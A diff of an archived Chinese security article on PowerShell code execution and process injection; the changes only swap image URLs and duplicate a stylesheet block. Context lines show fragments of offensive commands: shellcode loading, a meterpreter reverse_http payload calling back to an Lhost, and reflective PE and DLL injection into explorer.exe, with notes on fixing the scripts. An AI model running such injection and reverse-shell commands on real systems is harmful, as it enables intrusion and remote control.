@@ -3,7 +3,7 @@
 			<head>
 			     <title>Powershell tricks::Code Execution &amp; Process Injection - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/10556">http://drops.wooyun.org/tips/10556</a></h1>
 				
@@ -14,7 +14,7 @@
 
 <p>写这篇文章有两个原因，一是想介绍一下powershell的高级使用技巧，二是我在测试一些powershell脚本时发现了很多bug，提交给作者后更新的也不及时，于是就有了自己维护代码的想法. 接下来我会陆续把在drops上发的代码上传到github，大家共同学习，共同进步。 地址如下：<a href="https://github.com/3gstudent">https://github.com/3gstudent</a></p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551436363.net/20151117164438936" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164438936" alt="这里写图片描述"></p>
 
 <p>此图片来自于
 http://dfir-blog.com/2015/09/27/dissecting-powershell-attacks/</p>
@@ -77,7 +77,7 @@ Invoke-Shellcode -Shellcode @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551568622.net/20151117164458011" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164458011" alt="这里写图片描述"></p>
 
 <p>在win 7 x64下，将Shellcode替换为64为Shellcode，执行同样成功，截图略</p>
 
@@ -99,9 +99,9 @@ Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.16.245
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551613711.net/20151117164514527" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164514527" alt="这里写图片描述"></p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551614028.net/20151117164520652" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164520652" alt="这里写图片描述"></p>
 
 <p>win7 x64成功，略。<br>
 win8 x86成功，略。<br>
@@ -143,11 +143,11 @@ Invoke-ReflectivePEInjection -PEPath c:\test\test.exe -ExeArgs "Arg1" -ForceASLR
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551797844.net/20151117164532906" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164532906" alt="这里写图片描述"></p>
 
 <p>在win7 x64下，直接运行会报错，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551778658.net/20151117164540984" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164540984" alt="这里写图片描述"></p>
 
 <p><strong>解决方法：</strong></p>
 
@@ -155,7 +155,7 @@ Invoke-ReflectivePEInjection -PEPath c:\test\test.exe -ExeArgs "Arg1" -ForceASLR
 
 <p>换成64位的test.exe后执行，成功，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551850013.net/20151117164549964" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164549964" alt="这里写图片描述"></p>
 
 <p>win8 x86成功，略。<br>
 win8 x64成功，略。</p>
@@ -198,7 +198,7 @@ Invoke-ReflectivePEInjection -PEPath c:\test\test.b64 -ExeArgs "Arg1" -ForceASLR
 
 <p>在win7 x86下，测试成功，但速度很慢，实际使用时只需要做base64编码就好，去掉转成Unicode的功能，只做base64编码，测试文件为base64.ps1、4-CodeExecution-Exe(base64).ps1，测试成功，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551830870.net/20151117164628136" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164628136" alt="这里写图片描述"></p>
 
 <p>在win7 x64下，换用64位的test.exe，成功<br>
 win8 x86成功，略。<br>
@@ -237,11 +237,11 @@ Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString
 
 <p>在win7 x86下成功加载导出函数WStringFunc()，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551882011.net/20151117164641903" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164641903" alt="这里写图片描述"></p>
 
 <p>在win7 x64下，换成64位的DemoDLL，成功，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551917952.net/20151117164648776" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164648776" alt="这里写图片描述"></p>
 
 <p>win8 x86成功，略。<br>
 win8 x64成功，略。</p>
@@ -269,13 +269,13 @@ Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_http -
 
 <p>在win7 x86下执行报错，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551944421.net/20151117164701494" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164701494" alt="这里写图片描述"></p>
 
 <p>通过阅读代码找到错误原因，需要手动指定系统判断，因此需要在337行添加<code>$64bitCPU = $false</code></p>
 
 <p>再次运行，解决问题，meterpreter成功注入到explorer.exe中，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710551995915.net/20151117164722810" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164722810" alt="这里写图片描述"></p>
 
 <p>win7 x64成功，略。<br>
 win8 x86成功，略。<br>
@@ -300,17 +300,17 @@ Invoke-DllInjection -ProcessId $Proc.Id -Dll DemoDLL.dll
 
 <p>将DemoDLL.dll注入explorer.exe，成功，删除DemoDLL.dll提示已在记事本中打开，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710552028956.net/20151117164737118" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164737118" alt="这里写图片描述"></p>
 
 <p>在win7 x64下，换成64位的DemoDLL，成功，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710552023123.net/20151117164751885" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164751885" alt="这里写图片描述"></p>
 
 <p>win8 x86成功，略。</p>
 
 <p>win8 x64下，执行后报错，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710552164720.net/20151117164808294" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164808294" alt="这里写图片描述"></p>
 
 <p>查找错误位置，最终解决问题，需要更改第284行，将</p>
 
@@ -322,7 +322,7 @@ Invoke-DllInjection -ProcessId $Proc.Id -Dll DemoDLL.dll
 
 <p>并保存为7-Process Injection-dll(win8x64).ps1，然后执行成功，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20151117/2015111710552123721.net/20151117164819251" alt="这里写图片描述"></p>
+<p><img src="../images_result/images/20151117164819251" alt="这里写图片描述"></p>
 
 <h1>0x05 小结</h1>
 
